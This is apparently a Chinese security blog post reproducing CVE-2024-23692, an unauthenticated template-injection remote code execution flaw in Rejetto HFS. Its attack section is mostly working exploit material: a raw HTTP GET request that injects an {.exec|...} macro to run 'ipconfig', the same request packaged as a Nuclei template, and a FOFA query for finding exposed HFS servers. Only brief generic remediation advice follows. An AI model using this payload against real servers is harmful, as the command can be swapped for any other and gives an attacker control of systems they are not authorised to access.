#  漏洞复现 | Rejetto HTTP 文件服务器未经身份验证的 RCE【附poc】   
原创 实战安全研究  实战安全研究   2024-06-13 20:18  
  
**免责声明**  
<table><tbody><tr><td valign="top" rowspan="5" colspan="1" style="word-break: break-all;"><strong style="font-family: system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;color: rgb(255, 0, 0);font-size: 14px;outline: 0px;visibility: visible;"><strong style="outline: 0px;color: rgb(62, 62, 62);letter-spacing: 0.544px;orphans: 4;text-align: left;visibility: visible;"><span style="outline: 0px;color: rgb(255, 0, 0);letter-spacing: 0.544px;visibility: visible;">本文仅用于技术学习和讨论。请勿使用本文所提供的内容及相关技术从事非法活动，由于传播、利用此文所提供的内容或工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号无关，本次测试仅供学习使用。如有内容争议或侵权，请及时私信我们！我们会立即删除并致歉。谢谢！</span></strong></strong></td></tr><tr></tr><tr></tr><tr></tr><tr></tr></tbody></table>  
**一、漏洞描述**  
  
Rejetto HTTP File Server（Rejetto HFS）是Rejetto公司的一款 HTTP 文件服务器。Rejetto HTTP File Server 2.3m及之前版本存在安全漏洞，该漏洞源于存在模板注入漏洞，  
被确定为CVE-2024-23692，该漏洞的CVSS评分为9.8。允许  
未经身份验证  
的恶意攻击者  
可以任意命令  
，  
进而控制服务器系统  
。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1a2ibc10eKFVDOttuTHyy9SDfXGByEkHB4tVbM1Bdn6fTiatAY1XC5LwyLFNoF3kAwAlLhE6sicib56Q/640?wx_fmt=png&from=appmsg "")  
## 二、网络测绘  
```
fofa：
app="HFS"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1a2ibc10eKFVDOttuTHyy9SDqH4w1icRNsG9vfwGUcqNX03PROTqDSOHYKznhv6Yzf64fhJmia9cARQ/640?wx_fmt=png&from=appmsg "")  
## 三、漏洞复现  
  
测试执行ipconfig命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1a2ibc10eKFVDOttuTHyy9SASzjaFzNDbD28xHfYcWMu4OQjGlkkPJZPkonXG65S0HFQWZPmuyMRw/640?wx_fmt=png&from=appmsg "")  
  
**四、漏洞检测poc**  
```
GET /?n=%0A&cmd=ipconfig&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} HTTP/1.1
Host: 0.0.0.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


```  
  
****  
**五、Nuclei 检测POC**  
```
id: HFS_Rejetto_HTTP_RCE

info:
  name: HFS_Rejetto_HTTP_RCE
  author: hamal
  severity: high
  description: Rejetto HTTP 文件服务器未经身份验证的 RCE
  reference:
    - https://
  tags: 微信公众号（实战安全研究）

http:
  - raw:
      - |+
        GET /?n=%0A&cmd=ipconfig&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - Windows IP
      - type: status
        status:
          - 200

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF1a2ibc10eKFVDOttuTHyy9S0eEMhxuicxJuo07sia7SbLm32xQ4K5CRaLljibn4sQIwFLia8I8ibtYVM2A/640?wx_fmt=png&from=appmsg "")  
  
  
关注公众号：  
**实战安全研究**  
  
公众号回复"**Nuclei**  
" 获取往期Nuclei漏洞POC  
  
**六、漏洞修复**  
  
1、建议联系厂商打补丁或升级版本。  
  
2、增加Web应用防火墙防护。  
  
3、  
关闭互联网暴露面或接口设置访问权限。  
  
  
